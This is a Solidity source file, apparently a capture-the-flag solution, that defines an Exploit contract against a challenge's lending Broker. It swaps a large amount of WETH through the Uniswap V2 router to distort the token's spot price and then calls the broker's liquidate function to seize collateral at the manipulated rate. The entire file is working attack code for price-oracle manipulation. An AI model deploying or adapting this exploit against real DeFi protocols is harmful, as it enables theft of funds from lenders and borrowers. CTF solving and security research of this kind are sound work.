pragma solidity "0.8.0";

import "../public/Setup.sol";

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Exploit {
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router public constant router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    Setup setup;
    Broker broker;
    IUniswapV2Pair pair;

    event Log(uint collected);

    constructor(Setup _setup) payable {
        setup = _setup;
        pair = _setup.pair();
        broker = _setup.broker();
        weth.deposit{value: msg.value}();

        ERC20Like token = ERC20Like(address(setup.token()));
        weth.approve(address(router), type(uint).max);
        token.approve(address(router), type(uint).max);
        weth.approve(address(broker), type(uint).max);
        token.approve(address(broker), type(uint).max);

        uint wethSold = 14 ether;

        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);
        uint[] memory received = router.swapExactTokensForTokens(wethSold, 1 ether, path, address(this), type(uint).max);
        emit Log(received[1]);

        uint collateralRepaid = broker.liquidate(address(setup), received[1]);
        emit Log(collateralRepaid);
    }

    function getRate() public view returns (uint) {
        return setup.broker().rate();
    }

    function getTokenAddress() public view returns (address) {
        return address(setup.token());
    }
}